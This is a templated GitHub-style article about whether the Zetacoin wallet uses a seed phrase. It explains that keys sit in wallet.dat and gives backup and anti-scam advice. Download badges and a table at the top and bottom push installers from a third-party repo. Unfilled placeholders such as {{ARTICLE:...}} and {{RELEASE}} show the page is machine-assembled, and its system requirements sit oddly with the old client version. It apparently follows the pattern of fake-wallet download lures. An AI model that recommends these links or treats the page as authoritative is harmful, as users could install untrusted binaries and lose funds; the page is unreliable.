![Zetacoin Wallet](assets/banner-article.png)

<h1 align="center">Does Zetacoin Use a Seed Phrase?</h1>

<p align="center">How the Zetacoin wallet stores keys, and the steps that keep a copy which actually restores.</p>

<div align="center">
<a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Windows"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-20748c?style=for-the-badge&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="Download for macOS"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/Windows-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`zetacoin-0.13.2.2-win-setup.exe`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-universal-20748c?style=flat-square&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="macOS" height="24"> | macOS 12 or later | [`zetacoin-0.13.2.2-osx.dmg`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg) |
| <img src="https://img.shields.io/badge/Linux-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`zetacoin-0.13.2.2-linux.zip`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip) |

</div>

All three builds, their checksums and older tags are on the [Zetacoin Wallet release page](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/tag/v0.13.2.2).

> Only download from this GitHub release page.

---

No. Zetacoin Wallet has no seed phrase and no restore-from-words flow. The private keys live in `wallet.dat`, and that file is the backup. There are no twelve or twenty-four words to write down, and no phrase can regenerate a lost file. Anyone asking for a seed phrase is not describing this wallet.

## Why there is no phrase

Seed phrases are a convenience layered on top of key derivation: a short list of words encodes a seed from which many keys are generated deterministically. That design makes backup easy, because the words can rebuild the whole wallet.

Zetacoin Wallet predates that convention and stores keys directly in the wallet file. The file is the state; there is no derivation path to replay from words, and therefore nothing to encode.

That is a design difference, not a missing feature. It changes the backup procedure from "write down words" to "copy a file", which is why every backup page here centres on `wallet.dat`.

| Question | Answer |
| --- | --- |
| Is there a seed phrase? | no |
| Can I restore from words? | no |
| What is the backup? | `wallet.dat` |
| Can the file be encrypted? | yes, with a passphrase |
| Can a lost file be rebuilt from anything? | no |

The full walk-through, with the checks in order, is in [Where the Zetacoin Wallet File Lives](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/where-the-dat-file-lives.md).

## What to do instead

Copy `wallet.dat` to storage outside the machine, repeat after significant transactions, and keep more than one copy on different media. Encrypt the wallet first so that a stolen copy is useless.

Test a restore once. A backup you have never restored is a hope, and the test takes minutes when the chain is already synced.

That is the whole procedure. It is shorter than a seed-phrase ritual and it fails in exactly one way: no copy, no coins.

## How the two backup models compare

A seed phrase is small, portable and easy to duplicate: write it twice, store the copies apart, and the wallet can be rebuilt on any machine. Its weakness is that the phrase is a single secret which, once seen, gives away everything, and that people photograph it, email it or type it into a website that asks.

A wallet file is larger but no less portable, and it carries the same one-secret property unless it is encrypted. Its weakness is that losing it is losing the wallet, and that a copy made while the client was writing can be inconsistent.

Neither model is safer in the abstract. What differs is the failure that catches people: with words, it is disclosure; with a file, it is absence. This project's failure mode is the second, which is why every page about backups here emphasises copies rather than secrets.

For the background behind this step, [Restore a Zetacoin Wallet Backup](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/restore-a-backup-walkthrough.md) covers the same ground in more detail.

## The mistake this causes

People arrive from other wallets looking for the words. Not finding them, some conclude the wallet is unsafe or that they have missed a step, and a few invent a phrase to write down, which is worse than doing nothing because it creates a false sense of a backup.

Others store the wallet file in a password manager as an attachment, which works, or email it to themselves unencrypted, which does not. The file is key material; treat it like one.

The most expensive version is the person who deletes the file after "backing up" a phrase that never existed. There is nothing to restore from, and no tool can reverse it.

## What to tell someone who insists

People arrive with a fixed idea of how a wallet backup works, and a friend or a forum reply that says "just restore the seed" is enough to make them doubt a correct setup. The answer is mechanical: this wallet's keys are in a file, there is no derivation from words, and a restore is a file copy.

If a guide describes a twelve-word backup for Zetacoin, it is describing a different wallet, or a different project with a similar name. Checking the address prefix and the client's origin settles which software is involved, and the backup method follows from that.

The cost of getting this wrong is asymmetric. A person who writes down invented words believes they have a backup and may delete the file; a person who copies the file has a backup that works.

There is no legitimate reason for anyone to ask. Support does not need it, a recovery service cannot use it, and a "verification" step that requests it is theft with extra steps.

The same applies to the file itself. No support process needs `wallet.dat`, and sending it to anyone hands over every key it contains, encryption notwithstanding.

This is worth stating plainly because the absence of a seed phrase does not remove the scam; it just changes what the attacker asks for.

## What about the legacy chain?

Legacy wallets also used a file rather than words, so the same logic applies to a pre-2021 installation. A backup of a legacy wallet holds keys to a retired chain, which is a separate problem from the backup method.

{{ARTICLE:zetacoin-legacy-z-address-coins}} covers the legacy address question, and {{ARTICLE:what-happened-to-zetacoin-swap}} covers why those coins are no longer convertible.

## Common questions

### Can I recover my wallet with a seed phrase?

No. There is no seed phrase; the keys are in `wallet.dat`, and that file is what you restore.

### Is a wallet without a seed phrase less safe?

Not inherently. The file can be encrypted and copied like any other, and the risk profile is dominated by whether a backup exists, not by the backup's format.

### What happens if I lose the file?

The coins are unrecoverable unless another copy exists. There is no phrase, no recovery service and no administrative reset.

### Does the wallet generate words anywhere?

No. There is no recovery phrase screen and no word list to write down.

## The short answer, repeated

No seed phrase. Back up `wallet.dat`, encrypt it, keep two copies, and never send the file or a passphrase to anyone who asks.

Related pages: {{ARTICLE:how-to-backup-zetacoin-wallet}} for the procedure, {{ARTICLE:where-is-zetacoin-wallet-dat}} for the location, {{ARTICLE:restore-zetacoin-wallet-backup}} for the restore, and {{ARTICLE:zetacoin-wallet-encryption-passphrase}} for the passphrase. Install from {{RELEASE}} so the client you back up is the current one.

---

## Download Zetacoin Wallet

The three installers for v0.13.2.2 are listed at the top of this page: `zetacoin-0.13.2.2-win-setup.exe`, `zetacoin-0.13.2.2-osx.dmg` and `zetacoin-0.13.2.2-linux.zip`.

## Related guides

- [Is the Zetacoin Wallet Safe to Use?](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/is-the-desktop-client-safe.md)
- [How to Back Up the Zetacoin Wallet](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/how-to-back-up-the-dat-file.md)
- [Restore a Zetacoin Wallet Backup](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/restore-a-backup-walkthrough.md)
